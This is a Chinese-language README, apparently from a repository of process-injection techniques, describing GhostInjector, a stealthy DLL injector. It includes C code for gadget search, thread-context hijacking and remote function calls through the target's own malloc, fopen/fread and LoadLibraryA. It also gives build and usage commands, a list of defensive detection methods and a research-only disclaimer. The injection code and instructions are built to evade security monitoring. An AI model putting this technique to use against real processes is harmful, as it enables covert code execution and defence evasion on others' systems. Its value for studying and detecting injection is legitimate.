# GhostInjector（幽灵注入器）

## ⚠️ Windows 11 兼容性警告

**状态**: ❌ **不兼容 - Windows 11 操作系统限制**

**失败原因**:
- Windows 11 限制了 `GetThreadContext`/`SetThreadContext` API
- 错误码: 0x4764 (NTHREAD_GET_CONTEXT_ERROR)
- 错误码: 0x4765 (NTHREAD_SET_CONTEXT_ERROR)
- 即使有调试权限仍无法劫持线程上下文

**详细测试报告**: [docs/testing-guides/32-ghost-injector.md](../../docs/testing-guides/32-ghost-injector.md)

---

## 技术概述

GhostInjector 是一种极其高级的 DLL 注入技术，通过线程劫持和远程函数调用框架，实现**完全无 CreateRemoteThread、VirtualAllocEx、WriteProcessMemory** 的隐蔽注入。

该技术由 Serkan Aksoy (woldann) 开发，基于强大的 NThread 线程操作框架。

## 核心原理

### 传统 DLL 注入的特征

```c
// 传统方式（易被检测）
VirtualAllocEx(hProcess, ...);           // 分配可疑内存
WriteProcessMemory(hProcess, ...);        // 直接写入进程
CreateRemoteThread(hProcess, LoadLibraryA, ...);  // 创建远程线程
```

### GhostInjector 的突破

**核心思路**：完全利用目标进程自身的资源和函数，不使用任何可疑 API。

```
传统思维：分配内存 → 写入 DLL 路径 → 创建线程调用 LoadLibraryA

GhostInjector (NThread 框架)：
1. 线程劫持（修改现有线程上下文）
2. Gadget 搜索（push xxx; ret, jmp $ 等指令序列）
3. 使用目标进程的 msvcrt.dll!malloc 分配内存
4. 使用目标进程的 msvcrt.dll!memset 写入数据
5. 通过线程上下文调用 LoadLibraryA
6. 完全无 VirtualAllocEx/WriteProcessMemory/CreateRemoteThread
```

## 技术细节

### 1. NThread 框架架构

NThread 是一个完整的远程线程操作框架，包含以下核心模块：

**Neptune（基础设施）**：
- `nerror.h/c` - 错误处理系统
- `nlog.h/c` - 日志系统
- `nmem.h/c` - 内存管理
- `ntime.h/c` - 时间处理
- `nfile.h/c` - 文件操作
- `nmutex.h/c` - 互斥锁

**NThread（核心线程操作）**：
- `nthread.h/c` - 线程劫持核心
- `ntmem.h/c` - 远程内存管理
- `nttunnel.h/c` - 通道通信（用于数据传输）
- `ntutils.h/c` - 远程函数调用框架

**NThreadOSUtils（OS 特定工具）**：
- `ntosutils.h/c` - 跨平台封装
- `ntosutilswin.c` - Windows 特定实现（Gadget 搜索、线程查找）

### 2. Gadget 搜索

在目标进程中搜索特定指令序列：

**Push-Ret Gadget**（用于初始化线程控制）：
```asm
push rbp    ; 55 C3
push rbx    ; 53 C3
push rsi    ; 56 C3
push rdi    ; 57 C3
ret
```

**Sleep Gadget**（用于线程等待）：
```asm
jmp $       ; EB FE  (死循环)
```

实现在 `NThreadOSUtils/src/ntosutilswin.c`：
```c
void *find_gadget(uint16_t opcode) {
    // 枚举进程所有模块
    EnumProcessModules(proc, mods, sizeof(mods), &needed);

    // 遍历每个模块的可执行节
    for (i = 1; i < (needed / sizeof(HMODULE)); i++) {
        // 使用 VirtualQuery 找到可执行内存
        if (executable) {
            // 使用 memmem 搜索 opcode
            void *ret = memmem(addr, l, (void *)&opcode, sizeof(opcode));
            if (ret != NULL)
                return ret;
        }
    }
}
```

### 3. 线程劫持初始化

实现在 `NThread/src/nthread.c`：

```c
nerror_t nthread_init_ex(nthread_t *nthread, ntid_t thread_id,
                         nthread_reg_offset_t push_reg_offset,
                         void *push_addr, void *sleep_addr,
                         nthread_flags_t flags)
{
    // 1. 打开线程
    HANDLE thread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT |
                               THREAD_SUSPEND_RESUME, false, thread_id);

    // 2. 暂停线程
    SuspendThread(thread);

    // 3. 获取线程上下文
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_ALL;
    GetThreadContext(thread, &ctx);

    // 4. 保存原始寄存器
    DWORD64 orig_rip = ctx.Rip;
    DWORD64 orig_rsp = ctx.Rsp;
    DWORD64 orig_rbp = ctx.Rbp;  // 或其他寄存器

    // 5. 修改线程上下文
    ctx.Rip = push_addr;           // 跳转到 push rbp; ret
    ctx.Rsp = new_rsp;             // 新栈地址（对齐）
    ctx.Rbp = sleep_addr;          // rbp = jmp $ (等待地址)

    // 6. 设置新上下文
    SetThreadContext(thread, &ctx);

    // 7. 恢复线程
    ResumeThread(thread);

    // 线程现在会执行：
    // push rbp      ; 将 sleep_addr 压栈
    // ret           ; 弹出栈顶，跳转到 sleep_addr
    // jmp $         ; 进入死循环等待

    // 8. 等待线程进入 sleep 状态
    nthread_wait(nthread);
}
```

### 4. 远程函数调用

实现在 `NThread/src/ntutils.c`：

```c
void* ntu_ucall(void *func, void *arg) {
    ntutils_t *ntutils = ntu_get();
    nthread_t *nthread = &ntutils->nthread;

    // 修改线程上下文
    CONTEXT ctx;
    GetThreadContext(nthread->thread, &ctx);

    ctx.Rip = (DWORD64)func;    // 函数地址
    ctx.Rcx = (DWORD64)arg;     // 第一个参数（x64 calling convention）

    SetThreadContext(nthread->thread, &ctx);
    ResumeThread(nthread->thread);

    // 等待函数执行完成（返回到 sleep_gadget）
    nthread_wait(nthread);

    // 读取返回值（RAX）
    GetThreadContext(nthread->thread, &ctx);
    return (void*)ctx.Rax;
}
```

### 5. 远程内存管理

实现在 `NThread/src/ntmem.c`：

```c
typedef struct {
    void *local;      // 本地缓冲区
    void *remote;     // 远程地址
    size_t size;      // 大小
} ntmem_t;

// 分配远程内存（使用目标进程的 malloc）
ntmem_t* ntm_create_with_alloc_ex(size_t size) {
    ntmem_t *ntmem = malloc(sizeof(ntmem_t));

    // 本地分配缓冲区
    ntmem->local = malloc(size);
    ntmem->size = size;

    // 调用远程 malloc
    void *malloc_addr = GetProcAddress(GetModuleHandleA("msvcrt"), "malloc");
    ntmem->remote = ntu_ucall(malloc_addr, (void*)size);

    return ntmem;
}

// 写入远程内存（使用 fwrite 通过临时文件传输）
void* ntm_push(ntmem_t *ntmem) {
    // 在 nttunnel.c 中实现
    // 1. 创建临时文件
    // 2. 写入本地数据
    // 3. 在远程进程打开文件（fopen）
    // 4. 读取到远程内存（fread）
    // 5. 关闭文件并删除

    return ntmem->remote;
}
```

### 6. 完整注入流程

实现在 `GhostInjector/src/main.c`：

```c
int main(int argc, char *argv[]) {
    // 1. 初始化 Neptune
    neptune_init();

    // 2. 获取 LoadLibraryA 地址
    void *load_library_func = GetProcAddress(kernel32, "LoadLibraryA");

    // 3. 附加到目标线程（自动搜索活跃线程）
    nosu_attach(id);  // 或 nosu_find_thread_and_upgrade(pid)

    // 4. 创建远程内存并写入 DLL 路径
    ntmem_t *ntmem = ntm_create_with_alloc_ex(dll_path_size + 1);
    memcpy(NTM_LOCAL(ntmem), dll_path, dll_path_size);
    void *dll_path_addr = ntm_push(ntmem);

    // 5. 调用 LoadLibraryA
    void *load_library_ret = ntu_ucall(load_library_func, dll_path_addr);

    // 6. 清理
    ntm_delete(ntmem);
    ntu_destroy();
    neptune_destroy();
}
```

## 执行流程图

```
[GhostInjector]
    ↓
1. neptune_init()
   初始化 Neptune 基础设施
    ↓
2. nosu_attach(id) 或 nosu_find_thread_and_upgrade(pid)
   ├─ nosu_get_threads(pid)  枚举所有线程
   ├─ nosu_find_available_thread()  查找活跃线程
   │  ├─ 暂停线程
   │  ├─ 检查 RIP 是否变化（线程是否运行）
   │  └─ 选择第一个活跃线程
   ├─ find_gadget(PUSH_RBP_RET_OPCODE)  搜索 push gadget
   ├─ find_gadget(SLEEP_OPCODE)  搜索 jmp $ gadget
   └─ nthread_init_ex()  劫持线程初始化
      ├─ SuspendThread
      ├─ GetThreadContext  保存原始上下文
      ├─ 修改 RIP = push_addr, RSP = new_rsp, RBP = sleep_addr
      ├─ SetThreadContext
      ├─ ResumeThread
      └─ nthread_wait()  等待线程进入 sleep 状态
    ↓
3. ntm_create_with_alloc_ex(dll_path_len)
   ├─ 分配本地缓冲区
   └─ ntu_ucall(msvcrt!malloc, dll_path_len)
      ├─ 修改 RIP = malloc_addr, RCX = size
      ├─ SetThreadContext + ResumeThread
      ├─ nthread_wait()  等待执行完成
      └─ GetThreadContext  读取 RAX（返回值）
    ↓
4. ntm_push(ntmem)
   ├─ nttunnel_push()  通过临时文件传输数据
   │  ├─ 本地创建临时文件
   │  ├─ ntu_ucall(msvcrt!fopen, tempfile, "rb")
   │  ├─ ntu_ucall(msvcrt!fread, remote_buf, 1, len, file_handle)
   │  └─ ntu_ucall(msvcrt!fclose, file_handle)
   └─ 返回远程地址
    ↓
5. ntu_ucall(LoadLibraryA, dll_path_addr)
   ├─ 修改 RIP = LoadLibraryA_addr, RCX = dll_path_addr
   ├─ SetThreadContext + ResumeThread
   ├─ DLL 被加载到目标进程
   └─ nthread_wait()  等待执行完成
    ↓
6. 清理
   ├─ ntm_delete(ntmem)  释放远程内存（调用远程 free）
   ├─ ntu_destroy()  恢复线程原始上下文
   └─ neptune_destroy()  清理资源
    ↓
[注入完成] ✨
```

## 技术特点

| 特性 | 描述 |
|-----|------|
| ✅ 无 CreateRemoteThread | 使用线程劫持 |
| ✅ 无 VirtualAllocEx | 使用目标进程的 malloc |
| ✅ 无 WriteProcessMemory | 使用临时文件 + fread 传输数据 |
| ✅ 极高隐蔽性 | 避免所有传统注入 API |
| ✅ Gadget 复用 | 利用系统 DLL 的现有指令 |
| ✅ ASLR 利用 | 系统 DLL 基址在会话中一致 |
| ✅ 完整框架 | 3000+ 行代码，支持 TLS、Tunnel、远程调用 |
| ✅ 自动线程查找 | 智能选择活跃线程 |
| ⚠️ 稳定性依赖 | 需要目标进程加载 msvcrt.dll |
| ⚠️ x64 Only | 原始实现仅支持 x64 架构 |

## 防御检测方法

| 检测层面 | 方法 |
|---------|------|
| **API 监控** | Hook OpenThread 检测异常访问模式 |
| **线程监控** | 监控线程上下文被频繁修改 |
| **行为分析** | 检测线程从非正常地址执行 |
| **内存监控** | 监控 msvcrt!malloc 后立即被用于 DLL 路径 |
| **Gadget 检测** | 扫描进程中的 push-ret 和 jmp $ 序列 |
| **文件监控** | 监控临时文件创建和删除模式 |

## 技术来源

- **原作者**: Serkan Aksoy (woldann)
- **原仓库**: [woldann/GhostInjector](https://github.com/woldann/GhostInjector)
- **依赖库**:
  - [woldann/NThread](https://github.com/woldann/NThread) - 线程操作框架
  - [woldann/NThreadOSUtils](https://github.com/woldann/NThreadOSUtils) - OS 工具
  - [woldann/Neptune](https://github.com/woldann/Neptune) - 基础设施
- **首次公开**: ~2024-2025 年
- **命名来源**: "Ghost" 指避免所有可疑 API，如幽灵般隐形

## 编译说明

本实现使用 Git submodule 引用原版的 NThread、NThreadOSUtils 和 Neptune 库：

```bash
cd techniques/32-ghost-injector

# Submodules 已自动添加
# - NThread (线程操作框架)
# - NThreadOSUtils (OS 特定工具)
# - Neptune (基础设施)

# 编译（使用 GCC）
./build.sh

# 输出
bin/ghostinjector.exe
```

## 使用方法

```bash
# 注入到进程 ID
./bin/ghostinjector.exe 1234 C:\path\to\your.dll

# 注入到进程（GhostInjector 会自动查找活跃线程）
# 首先需要获取进程 ID 或线程 ID
```

**注意**：原版 GhostInjector 接受 `<thread_id|process_id>` 参数。如果提供进程 ID，它会自动枚举所有线程并选择第一个活跃线程。

## 参考链接

- [GhostInjector Repository](https://github.com/woldann/GhostInjector)
- [NThread Framework](https://github.com/woldann/NThread)
- [NThread Wiki](https://github.com/woldann/NThread/wiki)
- [Thread Hijacking Techniques](https://www.ired.team/offensive-security/code-injection-process-injection/injecting-to-remote-process-via-thread-hijacking)

## 重要提示

1. **仅限研究和防御用途**
   - 此技术仅用于安全研究和防御目的
   - 不得用于恶意攻击

2. **技术复杂性**
   - 需要深入理解 x64 调用约定
   - 需要掌握线程上下文操作
   - Gadget 搜索需要 PE 解析知识
   - 理解 NThread 框架需要时间

3. **稳定性考虑**
   - 目标进程必须加载 msvcrt.dll（Windows 默认加载）
   - 线程必须处于合适的状态
   - ASLR 基址一致性有时效性

4. **完整实现**
   - 本实现为**完整原版移植**
   - 使用 Git submodule 引用原始库
   - 包含完整的 NThread 框架（3000+ 行代码）
   - 支持所有原版特性：TLS、Tunnel、远程函数调用等

## 致谢

- [Serkan Aksoy (woldann)](https://github.com/woldann) - GhostInjector、NThread 和 Neptune 框架开发
- 线程劫持和远程代码执行技术研究社区
